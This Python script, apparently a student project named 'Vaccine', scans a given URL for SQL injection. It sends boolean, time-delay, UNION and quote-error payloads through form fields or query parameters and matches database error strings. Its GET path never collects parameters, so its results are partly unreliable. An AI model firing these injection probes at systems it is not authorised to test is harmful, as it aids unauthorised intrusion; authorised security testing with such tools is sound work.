import argparse
import requests
from urllib.parse import urlparse, urlencode, urlunparse
from bs4 import BeautifulSoup
import json
import time

# Payloads for tests
BOOLEAN_TESTS = ["' OR '1'='1", "' AND '1'='2"]
TIME_TESTS = ["' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"]
UNION_TESTS = ["' UNION SELECT null, null, null --", "' UNION SELECT 1,2,3 --"]
ERROR_TESTS = ["'", '"', "';"]

# Database error signatures
DB_ERRORS = {
    "mysql": [
        "You have an error in your SQL syntax",
        "mysql_fetch",
        "MySQL server version",
    ],
    "sqlite": ["SQLite3::", "sqlite3.OperationalError", "SQL syntax error"],
    "postgresql": [
        "PG::SyntaxError",
        "PostgreSQL query failed",
        "unterminated quoted string",
    ],
    "mssql": ["Unclosed quotation mark", "Incorrect syntax near", "SQL Server"],
    "oracle": ["ORA-", "Oracle Database error"],
}

DEFAULT_OUTPUT_FILE = "vaccine_results.json"


def parse_args():
    parser = argparse.ArgumentParser(
        description="Vaccine - SQL Injection Detection Tool"
    )
    parser.add_argument("url", type=str, help="Target URL to test for SQL injection")
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        default=DEFAULT_OUTPUT_FILE,
        help="Output file to store results (default: vaccine_results.json)",
    )
    parser.add_argument(
        "-X",
        "--request",
        type=str,
        choices=["GET", "POST"],
        default="GET",
        help="Type of request to use (default: GET)",
    )
    args = parser.parse_args()

    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        parser.error(
            "Invalid URL provided. Please ensure it starts with http:// or https://"
        )

    return args


def send_request(url, method, data=None):
    try:
        if method == "GET":
            response = requests.get(url, timeout=10, allow_redirects=True)
        elif method == "POST":
            response = requests.post(url, data=data, timeout=10, allow_redirects=True)
        print(f"[*]response {response.text}")
        return response
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None


def detect_database(response_text):
    """Detect the database engine based on error messages."""
    print("[*] Detecting database type from response text...", response_text)
    for db, errors in DB_ERRORS.items():
        for error in errors:
            if error in response_text:
                return db
    return "unknown"


def boolean_based_test(url, method, param, post_data=None):
    """Perform boolean-based SQL injection test."""
    print(
        f"[*] Testing boolean-based SQL injection on parameter: {param} in {method} request"
    )
    for payload_true in BOOLEAN_TESTS:
        payload_false = (
            BOOLEAN_TESTS[1] if payload_true == BOOLEAN_TESTS[0] else BOOLEAN_TESTS[0]
        )

        if method == "GET":
            new_params = {param: payload_true}
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(urlparse(url)._replace(query=new_query))
            resp_true = send_request(test_url, method)

            new_params[param] = payload_false
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(urlparse(url)._replace(query=new_query))
            resp_false = send_request(test_url, method)
        else:
            new_data = post_data.copy()
            new_data[param] = payload_true
            resp_true = send_request(url, method, data=new_data)
            new_data[param] = payload_false
            resp_false = send_request(url, method, data=new_data)

        if resp_true and resp_false and resp_true.text != resp_false.text:
            return True, payload_true
    return False, None


def time_based_test(url, method, param, post_data=None):
    """Perform time-based SQL injection test."""
    for payload in TIME_TESTS:
        start_time = time.time()
        if method == "GET":
            new_params = {param: payload}
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(urlparse(url)._replace(query=new_query))
            send_request(test_url, method)
        else:
            new_data = post_data.copy()
            new_data[param] = payload
            send_request(url, method, data=new_data)

        elapsed_time = time.time() - start_time
        if elapsed_time > 4:  # If response time exceeds 4 seconds, likely vulnerable
            return True, payload
    return False, None


def union_based_test(url, method, param, post_data=None):
    """Perform union-based SQL injection test."""
    for payload in UNION_TESTS:
        if method == "GET":
            new_params = {param: payload}
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(urlparse(url)._replace(query=new_query))
            response = send_request(test_url, method)
        else:
            new_data = post_data.copy()
            new_data[param] = payload
            response = send_request(url, method, data=new_data)

        if response and "null" in response.text.lower():
            return True, payload
    return False, None


def error_based_test(url, method, param, post_data=None):
    """Perform error-based SQL injection test."""
    for payload in ERROR_TESTS:
        if method == "GET":
            new_params = {param: payload}
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(urlparse(url)._replace(query=new_query))
            response = send_request(test_url, method)
        else:
            new_data = post_data.copy()
            new_data[param] = payload
            response = send_request(url, method, data=new_data)

        if response:
            db_type = detect_database(response.text)
            if db_type != "unknown":
                return True, payload, db_type
    return False, None, None


def get_form_fields(url):
    """Fetch the page, parse the first form, extract input names, fill with dummy values."""
    try:
        print("[*] Fetching page to extract form inputs...")
        response = requests.get(url, timeout=10, allow_redirects=True)
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.find("form")
        if not form:
            print("[!] No form found on the page")
            return {}

        fields = {}
        for input_tag in form.find_all("input"):
            name = input_tag.get("name")
            if name:
                fields[name] = "test"
        return fields
    except Exception as e:
        print(f"[!] Error fetching or parsing form: {e}")
        return {}


def inject_payloads(url, method):
    """Run a battery of tests against the URL."""
    results = []

    if method == "POST":
        post_data = get_form_fields(url)
        keys = list(post_data.keys())
    else:
        post_data = None
        keys = None

    if not keys:
        print("[!] No parameters to test for injection.")
        return results

    for param in keys:
        print(f"[*] Testing parameter: {param}")

        # Boolean-Based Test
        vulnerable, payload = boolean_based_test(url, method, param, post_data)
        if vulnerable:
            print(
                f"[+] Boolean-based SQLi detected on parameter '{param}' with payload '{payload}'"
            )
            results.append({"param": param, "type": "boolean", "payload": payload})
            continue

        # Time-Based Test
        vulnerable, payload = time_based_test(url, method, param, post_data)
        if vulnerable:
            print(
                f"[+] Time-based SQLi detected on parameter '{param}' with payload '{payload}'"
            )
            results.append({"param": param, "type": "time", "payload": payload})
            continue

        # Union-Based Test
        vulnerable, payload = union_based_test(url, method, param, post_data)
        if vulnerable:
            print(
                f"[+] Union-based SQLi detected on parameter '{param}' with payload '{payload}'"
            )
            results.append({"param": param, "type": "union", "payload": payload})
            continue

        # Error-Based Test
        vulnerable, payload, db_type = error_based_test(url, method, param, post_data)
        if vulnerable:
            print(
                f"[+] Error-based SQLi detected on parameter '{param}' with payload '{payload}' (DB: {db_type})"
            )
            results.append(
                {
                    "param": param,
                    "type": "error",
                    "payload": payload,
                    "db_type": db_type,
                }
            )
            continue

    return results


def save_results(results, filename):
    try:
        with open(filename, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to {filename}")
    except Exception as e:
        print(f"[!] Could not save results: {e}")


def main():
    args = parse_args()
    url = args.url
    method = args.request.upper()
    output_file = args.output

    print(f"[*] Starting vaccine scan on {url} using {method} method")
    results = inject_payloads(url, method)

    if results:
        print("[*] Vulnerabilities found:")
        for res in results:
            print(json.dumps(res, indent=2))
    else:
        print("[*] No vulnerabilities detected.")

    save_results(results, output_file)


if __name__ == "__main__":
    main()
